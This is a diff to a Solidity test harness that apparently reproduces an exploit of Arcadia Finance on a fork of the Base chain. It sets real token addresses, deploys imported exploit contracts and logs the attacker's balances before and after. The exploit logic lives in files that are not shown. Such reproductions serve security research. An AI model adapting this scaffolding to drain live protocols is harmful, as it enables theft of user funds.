@@ -7,28 +7,43 @@ import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";
 import {IWETH9} from "../../interfaces/IWETH9.sol";
 import {Exploit1} from "./Exploit1.sol";
 import {ExploitHook} from "./ExploitHook.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
 contract Exploit_ArcadiaFinance is TestHarness, TokenBalanceTracker {
+    IERC20 internal constant USDC =
+        IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
+
+    IWETH9 internal constant WETH =
+        IWETH9(0x4200000000000000000000000000000000000006);
+
+    IERC20 internal constant cbBTC =
+        IERC20(0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf);
+
     function setUp() external {
         cheat.createSelectFork("base", 32881440);
 
-        // addTokenToTracker(address(weth));
-        // addTokenToTracker(address(usdc));
-        // addTokenToTracker(address(wbtc));
+        addTokenToTracker(address(WETH));
+        addTokenToTracker(address(USDC));
+        addTokenToTracker(address(cbBTC));
 
         updateBalanceTracker(address(this));
     }
 
     function test_attack() external {
-        console.log("===== Initial Balances =====");
-        logBalancesWithLabel("Attacker", tx.origin);
-        logBalancesWithLabel("Attacker Contract", address(this));
-
+        
+        
         // Deploy the exploit hook contract
         ExploitHook exploitHook = new ExploitHook();
 
         // Deploy the exploit contract 1
         Exploit1 exploit1 = new Exploit1();
+        
+        updateBalanceTracker(address(exploit1));
+
+        console.log("===== Initial Balances =====");
+        logBalancesWithLabel("Attacker", address(this));
+        logBalancesWithLabel("Attacker Contract", address(exploit1));
+
 
         exploit1.createAccounts(15, 0xDa14Fdd72345c4d2511357214c5B89A919768e59);
 
@@ -47,5 +62,9 @@ contract Exploit_ArcadiaFinance is TestHarness, TokenBalanceTracker {
                 150000000000000000000 // number
             )
         );
+
+        console.log("===== Final Balances =====");
+        logBalancesWithLabel("Attacker", address(this));
+        logBalancesWithLabel("Attacker Contract", address(exploit1));
     }
 }
